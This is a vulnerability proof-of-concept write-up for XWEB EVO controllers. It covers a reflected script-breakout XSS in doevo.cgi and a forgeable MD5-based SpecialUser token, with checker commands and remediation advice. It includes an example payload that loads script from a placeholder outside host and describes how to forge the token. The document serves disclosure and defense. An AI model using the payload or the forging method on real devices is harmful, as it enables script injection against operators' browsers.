# PoC32 — XWEB EVO doevo.cgi script-breakout XSS and forgeable SpecialUser token

## Status

Dynamically validated against the genuine `doevo.cgi` binary from the official
5.8.8 package, both in an offline CGI harness and through the loopback HTTP
runtime, and re-validated with the public authorization-gated remote checker.
No physical controller or third-party address was contacted; no browser was
involved and no external script was ever loaded.

- XWEB3000/5000 EVO 5.8.8 i686 (same binary ships in FCEVO): confirmed.
- Both checks are unauthenticated but bounded: the XSS requires a specific
  route constraint, and the token is a feature flag, **not** a login bypass.
- EVO reached End of Support in March 2026. Physical reachability and real
  browser rendering remain unverified.

## Finding 1 — reflected script-breakout XSS

### Root cause

At the `<!-- IPR -->` marker of the served `index.html`, `doevo.cgi` emits
(main, `0x804937c–0x8049393`):

```c
fprintf(stdout, "<script ...>window.querystring = '%s';</script>\n", dup);
```

where `dup` is the request URI substring starting at `?`. The filtering helper
(`0x8049810`) is a case-insensitive **blacklist**, not a contextual escaper: the
URI is rejected only if it contains `alert`, `confirm`, `cgi-bin`, any of
`( ) ; " % '`, or no `?`. Angle brackets, `/`, `=`, and `.` pass through, so a
payload such as `?MARKER</script><script src=//host/x.js></script>` is emitted
verbatim into the page.

### Route constraint (important)

Because `cgi-bin` itself is blacklisted, the canonical
`/cgi-bin/doevo.cgi?...` URI does **not** reflect. Exploitation requires a
route onto the same binary without that substring; the shipped configuration
provides two:

- `/` — `etc/lighttpd/lighttpd.conf:121` sets `index-file.names` to the CGI;
- `/ARlogin/SpecialUser` — `etc/lighttpd/lighttpd.conf:214` aliases it.

The remote checker uses the index route and includes the canonical route as a
negative control.

### Harmless proof

The checker sends a non-executing breakout marker as raw request text:

```text
/?EVOPOC<random></script><svg>EVOPOC<random></svg>
```

An empty `<svg>` element with no event handler cannot execute anything; the
response is inspected as text only, confirming the marker crossed the
`</script>` boundary verbatim. No script-bearing payload is used.

```bash
python3 tools/xweb_evo_remote.py --authorized xss http://<your-device>
```

Expected sanitized result:

```json
{
  "confirmed": true,
  "marker_reflected_verbatim": true,
  "cgi_bin_route_blocked": true,
  "exit_code": 0
}
```

## Finding 2 — forgeable SpecialUser `art` token (feature flag, not a login bypass)

### Root cause

The `art` token is plain MD5 of `HTTP_HOST-unixtime`
(`art = md5("<Host>-<time>")`, via the shipped `libxmd5.so`), accepted for
`time()-5 … time()+5` inclusive (comparison loop at `0x8048dc1–0x8048f1b`).
Neither the host value nor the time is secret, so the token is forgeable
offline.

### What the token actually does

A valid token changes exactly one region of the response:
`window.INITPARAM = -1;` becomes `window.INITPARAM = -2;`. Nothing else is
served and **no session is created**. The flag is consumed later by
`login.lua:126`:

```lua
if initparam == -2 and xwebconfig('custom_arneg') and (isAdministrator or permissions.tools['activeregulation-edit'] == 1) then
```

which merely adds the active-regulation desktop **after** a normal login with
valid credentials and the matching permission. Zero and stale tokens are
rejected, and a forged token alone grants no data, no session, and no desktop.

### Harmless proof

The checker uses the device's own `Date` header as the clock source, tries the
±5 second window, and requires both negative controls:

```bash
python3 tools/xweb_evo_remote.py --authorized specialuser http://<your-device>
```

Expected sanitized result:

```json
{
  "confirmed": true,
  "baseline_initparam_minus1": true,
  "forged_token_accepted": true,
  "zero_token_rejected": true,
  "stale_token_rejected": true,
  "no_session_granted": true,
  "classification": "feature-flag pre-arm only, not a login bypass",
  "exit_code": 0
}
```

Output of both checks contains no target address, credentials, session token,
MAC/IP, or raw device response.

## Cleanup

Both checks are read-only and stateless: nothing is written on the device, no
session is created, and there is nothing to remove.

## Impact and boundaries

The XSS is a working reflected script-injection primitive for victims' browsers
on constrained routes (index/SpecialUser aliases); real browser exploitation,
session theft, and reachability were not tested, and no payload was executed in
this work. The SpecialUser token demonstrates weak token construction, but its
practical impact is limited to pre-arming a feature flag; it must not be
reported or scored as an authentication bypass.

## Remediation

- Replace the blacklist with contextual JavaScript/HTML output encoding, and
  avoid reflecting the raw request URI at all.
- Treat `</script>` breakout sequences as hostile regardless of route; do not
  rely on the `cgi-bin` substring for safety.
- Replace the MD5(host,time) token with an unguessable, single-use,
  server-generated value bound to a server-side grant; keep feature flags
  server-side rather than trusting client-forwarded `initparam` values.
- Add regression tests for breakout payloads on every alias route and for
  zero/stale/forged tokens.
